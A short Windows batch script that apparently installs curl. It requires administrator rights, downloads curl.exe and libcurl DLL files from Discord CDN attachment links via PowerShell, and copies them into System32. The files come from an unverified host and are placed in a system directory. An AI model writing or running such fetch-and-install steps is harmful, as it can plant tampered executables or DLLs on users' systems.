@echo off
set sys=%cd%
if "%cd%"=="%systemdrive%\Windows\System32" goto yes
goto no

:no
echo please run this as administrator.
pause >nul | echo Press any key to exit.
exit

:yes
set own=%~dp0
cd %own%
echo making a folder...
set foname=curl
mkdir %foname%
cd %cd%\%foname%
echo downloading...
set fname=curl.exe
set url=https://cdn.discordapp.com/attachments/1074216236449271889/1074216306666127440/curl.exe
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%fname%')" >nul
set fname=libcurl-x64.def
set url=https://cdn.discordapp.com/attachments/1074216236449271889/1074216307014242404/libcurl-x64.def
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%fname%')" >nul
set fname=libcurl-x64.dll
set url=https://cdn.discordapp.com/attachments/1074216236449271889/1074216307484016760/libcurl-x64.dll
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%fname%')" >nul
echo copying to system...
copy "%cd%\*.*" "%sys%\*.*"
cls
echo Completed!
echo You can now run the programs!
pause >nul | echo Press any key to exit.
exit